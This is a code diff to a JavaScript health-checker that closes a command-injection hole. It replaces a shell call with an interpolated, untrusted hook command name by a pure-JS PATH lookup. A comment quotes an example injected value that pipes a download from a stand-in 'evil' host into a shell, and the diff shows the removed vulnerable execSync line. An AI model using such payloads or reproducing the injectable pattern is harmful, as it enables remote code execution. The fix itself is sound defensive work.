@@ -1087,13 +1087,40 @@ class HealthChecker {
   }
   
   commandExists(command) {
+    // SECURITY: `command` originates from a project's .claude/settings.json hook
+    // definitions, which are untrusted (a cloned repo can ship a hostile one).
+    // Never pass it to a shell — `execSync(`command -v ${command}`)` let a value
+    // like "echo;curl evil|sh" execute during `--health-check`. Resolve against
+    // PATH purely in JS instead: no shell, no subprocess, no interpolation.
+    if (typeof command !== 'string' || command.length === 0) return false;
+
+    // If it contains a path separator, test that exact file for executability.
+    if (command.includes('/') || command.includes('\\')) {
+      return this.isExecutableFile(command);
+    }
+
+    const pathDirs = (process.env.PATH || '').split(path.delimiter).filter(Boolean);
+    // On Windows, a bare name may resolve via PATHEXT extensions.
+    const exts = process.platform === 'win32'
+      ? (process.env.PATHEXT || '.EXE;.CMD;.BAT;.COM').split(';').filter(Boolean)
+      : [''];
+    for (const dir of pathDirs) {
+      for (const ext of exts) {
+        if (this.isExecutableFile(path.join(dir, command + ext))) {
+          return true;
+        }
+      }
+    }
+    return false;
+  }
+
+  isExecutableFile(filePath) {
     try {
-      execSync(`command -v ${command}`, { 
-        encoding: 'utf8', 
-        stdio: 'pipe',
-        timeout: 2000 
-      });
-      return true;
+      const stat = fs.statSync(filePath);
+      if (!stat.isFile()) return false;
+      if (process.platform === 'win32') return true; // executability is by extension
+      // POSIX: any execute bit set.
+      return (stat.mode & 0o111) !== 0;
     } catch (error) {
       return false;
     }
